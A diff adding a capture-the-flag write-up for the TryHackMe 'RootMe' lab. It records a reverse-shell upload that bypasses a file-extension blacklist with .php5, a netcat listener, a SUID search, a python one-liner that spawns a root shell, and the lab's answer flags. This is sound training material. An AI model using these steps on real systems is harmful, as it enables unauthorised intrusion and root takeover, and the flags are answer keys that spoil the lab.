@@ -82,4 +82,65 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 ## Task 3  Getting a shell
 
 ### Find a form to upload and get a reverse shell, and find the flag.
-Answer the questions below
+user.txt
+
+Downloaded 
+
+https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+and set reverse shell listener
+
+sudo nc -lvnp 443
+
+Fiddling around with the blacklist filter on /panel was able to get a revershe shell using the extension .php5
+
+```
+Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 19:47:26 up 30 min,  0 users,  load average: 0.12, 0.04, 0.20
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+```
+
+Getting user txt
+
+```
+$ find / -type f -name user.txt 2>/dev/null
+/var/www/user.txt
+```
+
+THM{y0u_g0t_a_sh3ll}
+
+## Task 4  Privilege escalation
+
+### Search for files with SUID permission, which file is weird?
+
+/usr/bin/python 
+
+```
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+
+...
+-rwsr-sr-x 1 root root 3665768 Aug  4  2020 /usr/bin/python
+...
+
+```
+
+Spawn root shell
+
+```
+./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+
+Getting root txt
+
+```
+
+find / -type f -name root.txt 2>/dev/null
+/root/root.txt
+cat /root/root.txt
+THM{pr1v1l3g3_3sc4l4t10n}
+```
+
+### root.txt
+THM{pr1v1l3g3_3sc4l4t10n}
